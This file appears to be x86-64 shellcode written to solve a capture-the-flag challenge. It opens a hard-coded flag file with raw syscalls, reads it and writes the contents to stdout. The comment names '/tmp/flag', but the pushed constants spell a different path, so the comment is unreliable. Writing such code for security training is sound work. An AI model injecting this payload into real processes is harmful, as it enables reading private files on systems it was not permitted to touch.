section .text
global _start
_start:
	push 0x0
	mov rax, 0x676e6f6f6f6f6f6f
	push rax
	mov rax, 0x6c5f73695f656d61
	push rax
	mov rax, 0x6e5f67616c662f63
	push rax
	mov rax, 0x697361625f6c6c65
	push rax
	mov rax, 0x68732f656d6f682f
	push rax
	mov rdi, rsp    ; rdi = "/tmp/flag"
	xor rsi, rsi    ; rsi = 0 ; RD_ONLY
	xor rdx, rdx    ; rdx = 0
	mov rax, 2      ; rax = 2 ; syscall_open
	syscall
	mov rdi, rax      ; rdi = fd
	mov rsi, rsp
	sub rsi, 0x30     ; rsi = rsp-0x30 ; buf
	mov rdx, 0x30     ; rdx = 0x30     ; len
	mov rax, 0x0      ; rax = 0        ; syscall_read
	syscall
	mov rdi, 1        ; rdi = 1 ; fd = stdout
	mov rax, 0x1      ; rax = 1 ; syscall_write
	syscall           ; write(fd, buf, 0x30)
